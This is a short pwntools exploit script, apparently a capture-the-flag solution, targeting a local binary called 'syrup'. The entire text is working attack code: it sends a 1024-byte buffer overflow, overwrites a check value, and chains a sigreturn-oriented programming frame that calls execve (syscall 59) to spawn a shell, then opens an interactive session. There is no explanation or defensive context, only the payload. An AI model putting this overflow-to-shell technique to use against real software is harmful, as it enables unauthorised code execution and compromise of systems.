from pwn import *
 
io = process("./syrup")
context.terminal = ['gnome-terminal','-x','sh','-c']
context.arch = 'amd64'
gdb.attach(io)
sigreturn = p64(0x0000000000401000)

frame = SigreturnFrame()
 
frame.rip = 0x000000000040100f
frame.rax = 59
frame.rdi = 0x40103a
frame.rsi = 0x0
frame.rdx = 0x0
io.recvuntil("Can you pwn me?\n")
payload = "A" * 1024 + p64(0x6042) +  "A" * 8 + sigreturn + str(frame)[8:]
io.sendline(payload)
io.interactive()
